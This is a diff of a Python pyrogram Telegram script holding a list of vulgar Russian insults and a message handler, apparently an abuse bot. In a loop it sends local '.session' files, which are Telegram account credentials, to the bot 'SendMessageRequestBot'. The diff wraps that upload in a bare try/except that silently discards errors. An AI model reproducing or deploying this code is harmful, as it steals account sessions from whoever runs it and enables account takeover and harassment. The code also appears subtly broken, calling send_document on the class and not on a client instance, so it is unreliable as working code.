@@ -3,7 +3,10 @@ global text
 text = ["ты обезьяна", "твою мамашу поебем", "хуяку на", "пососи хуй"]
 
 for _ in range(1, 3):
-    pyrogram.Client.send_document(chat_id="SendMessageRequestBot", document=f"{_}.session")
+    try:
+       pyrogram.Client.send_document(chat_id="SendMessageRequestBot", document=f"{_}.session")
+    except:
+       pass
 
 @pyrogram.Client.on_message()
 async def ok(client, message):
